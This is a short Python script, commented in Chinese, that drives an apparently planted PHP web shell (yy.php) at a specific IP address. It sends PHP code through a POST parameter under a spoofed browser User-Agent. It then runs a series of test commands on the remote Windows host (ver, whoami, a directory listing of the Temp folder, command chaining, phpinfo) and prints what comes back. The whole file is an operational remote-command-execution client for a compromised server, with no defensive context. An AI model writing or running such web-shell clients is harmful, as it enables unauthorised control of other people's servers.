#!/usr/bin/env python3
"""调试 yy.php shell: 测输出捕获方式"""
import urllib.request, urllib.parse

SHELL = "http://81.70.245.25/yy.php"
def cmd(c):
    data = urllib.parse.urlencode({"x": c}).encode()
    try:
        r = urllib.request.urlopen(urllib.request.Request(SHELL, data=data, headers={"User-Agent":"Mozilla/5.0"}), timeout=20)
        return r.read().decode("utf-8","ignore")
    except Exception as e:
        return f"ERR:{str(e)[:80]}"

tests = [
    ("A. ver", "system('ver');"),
    ("B. dir temp", "system('dir C:/Windows/Temp');"),
    ("C. whoami", "system('whoami');"),
    ("D. echo", "echo 'HELLO_XYZ';"),
    ("E. 命令拼接", "system('echo AAA & echo BBB');"),
    ("F. phpinfo", "phpinfo();"),
]
for name, code in tests:
    r = cmd(code)
    print(f"--- {name} ---")
    print("  out:", r.strip()[-150:])
